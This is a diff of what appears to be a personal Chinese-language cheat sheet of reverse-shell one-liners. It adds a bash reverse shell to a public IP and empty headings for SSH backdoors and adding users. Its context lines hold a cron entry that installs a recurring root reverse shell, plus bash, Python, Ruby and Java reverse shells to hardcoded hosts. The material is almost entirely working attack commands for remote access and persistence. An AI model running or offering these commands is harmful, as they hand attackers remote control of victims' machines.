@@ -48,8 +48,12 @@ echo '* * * * * bash -i >& /dev/tcp/114.215.27.76/9998 0>&1' >> /var/spool/cron/
 
 echo '* * * * * bash -i >& /dev/tcp/114.215.27.76/9998 0>&1' >> /var/spool/cron/root
 
+
+
 #bash反弹
 bash -i >& /dev/tcp/192.168.10.27/4444 0>&1
+# sh情况
+/bin/bash -c "bash -i >& /dev/tcp/114.215.27.76/9997 0>&1"
 
 #python反弹
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
@@ -66,5 +70,13 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 #Java反弹
 r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
 
+```
+
+##  ssh后门
+
+## 添加用户
+
+```
+	
 ```
 
